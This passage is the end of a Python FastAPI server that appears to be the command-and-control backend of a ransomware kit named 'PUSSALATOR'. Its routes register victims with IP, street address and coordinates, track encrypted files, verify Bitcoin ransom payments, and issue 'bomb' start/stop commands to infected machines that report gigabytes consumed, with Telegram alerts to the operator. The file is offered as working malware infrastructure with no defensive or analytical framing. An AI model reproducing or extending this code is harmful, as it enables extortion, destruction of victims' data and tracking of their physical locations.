                loadBombs();
            }
        }
        
        async function logout() {
            window.location.href = '/';
        }
        
        function updateTime() {
            document.getElementById('timestamp').innerText = new Date().toLocaleString();
        }
        
        setInterval(() => {
            loadStats();
            loadVictims();
            loadBombs();
            loadLogs();
            updateTime();
        }, 3000);
        
        loadStats();
        loadVictims();
        loadBombs();
        loadLogs();
        updateTime();
    </script>
</body>
</html>
"""

# ============================================================================
# API ROUTES
# ============================================================================

@app.get('/', response_class=HTMLResponse)
async def index():
    return INDEX_HTML

@app.get('/victim', response_class=HTMLResponse)
async def victim_page():
    return VICTIM_HTML

@app.get('/owner/login', response_class=HTMLResponse)
async def owner_login_page():
    return OWNER_LOGIN_HTML

@app.get('/owner/dashboard', response_class=HTMLResponse)
async def owner_dashboard():
    return OWNER_DASHBOARD_HTML

@app.get('/api/stats')
async def get_stats():
    return db.get_stats()

@app.get('/api/logs')
async def get_logs(limit: int = 100):
    return db.get_logs(limit)

@app.get('/api/victims')
async def get_victims():
    return db.get_all()

@app.get('/api/victim/{vid}')
async def get_victim(vid: str):
    v = db.get_victim(vid)
    if not v:
        raise HTTPException(404)
    return v

@app.post('/api/add-victim')
async def add_victim(victim: VictimRegister):
    return db.add_victim(
        victim_id=victim.victim_id,
        files=victim.files,
        hostname=victim.hostname,
        ip=victim.ip,
        country=victim.country,
        region=victim.region,
        city=victim.city,
        zip_code=victim.zip,
        street=victim.street,
        lat=victim.lat,
        lon=victim.lon,
        isp=victim.isp,
        organization=victim.organization,
        os_info=victim.os
    )

@app.post('/api/update-victim')
async def update_victim(req: Request):
    data = await req.json()
    success = db.update_victim(data.get('victim_id'), {'files': data.get('files_encrypted')})
    return {'success': success}

@app.post('/api/verify-payment')
async def verify_payment(payment: PaymentVerify):
    success = db.verify_payment(payment.victim_id, payment.tx_id)
    return {'success': success}

@app.delete('/api/victim/{vid}')
async def delete_victim(vid: str):
    success = db.delete_victim(vid)
    return {'success': success}

# ============================================================================
# BOMB API
# ============================================================================

@app.post('/api/bomb/start')
async def bomb_start(bomb: BombStart):
    db.add_bomb_command(bomb.client_id, {
        'action': 'start',
        'filename': bomb.filename,
        'timestamp': datetime.now().isoformat()
    })
    db.update_bomb_status(bomb.client_id, 'pending')
    db.log('info', f"Bomb start command sent to {bomb.client_id}")
    telegram.notify_bomb(bomb.client_id, "start")
    return {'success': True}

@app.post('/api/bomb/stop')
async def bomb_stop(bomb: BombStop):
    db.add_bomb_command(bomb.client_id, {
        'action': 'stop',
        'timestamp': datetime.now().isoformat()
    })
    db.log('info', f"Bomb stop command sent to {bomb.client_id}")
    telegram.notify_bomb(bomb.client_id, "stop")
    return {'success': True}

@app.get('/api/bomb/command/{client_id}')
async def get_bomb_command(client_id: str):
    cmd = db.get_bomb_command(client_id)
    if cmd:
        return cmd
    return {'action': 'none'}

@app.post('/api/bomb/update')
async def bomb_update(update: BombUpdate):
    if update.error:
        db.update_bomb_status(update.client_id, 'error')
        db.log('error', f"Bomb error for {update.client_id}: {update.error}")
    else:
        status = 'active' if update.size_gb and update.size_gb > 0 else 'inactive'
        db.update_bomb_status(update.client_id, status, update.size_gb or 0)
        if update.size_gb and update.size_gb > 0:
            db.log('info', f"Bomb progress for {update.client_id}: {update.size_gb:.2f} GB")
    return {'success': True}

# ============================================================================
# OWNER API
# ============================================================================

@app.post('/api/owner/login')
async def owner_login(login: OwnerLogin):
    success = login.password == Config.OWNER_PASSWORD
    return {'success': success}

# ============================================================================
# HEALTH CHECK
# ============================================================================

@app.get('/health')
async def health():
    return {
        'status': 'ok',
        'time': datetime.now().isoformat(),
        'victims': len(db.victims),
        'telegram': telegram.enabled,
        'version': '1.0.0'
    }

# ============================================================================
# MAIN
# ============================================================================

if __name__ == "__main__":
    port = int(os.environ.get('PORT', 8000))
    host = os.environ.get('HOST', '0.0.0.0')
    
    logger.info("=" * 50)
    logger.info("PUSSALATOR v1.0")
    logger.info("=" * 50)
    logger.info(f"Port: {port}")
    logger.info(f"Host: {host}")
    logger.info(f"Victims: {len(db.victims)}")
    logger.info(f"Telegram: {'ON' if telegram.enabled else 'OFF'}")
    logger.info(f"Wallet: {Config.BTC_WALLET}")
    logger.info("=" * 50)
    
    uvicorn.run(
        "main:app",
        host=host,
        port=port,
        log_level=Config.LOG_LEVEL.lower(),
        reload=Config.ENVIRONMENT == 'development'
    )
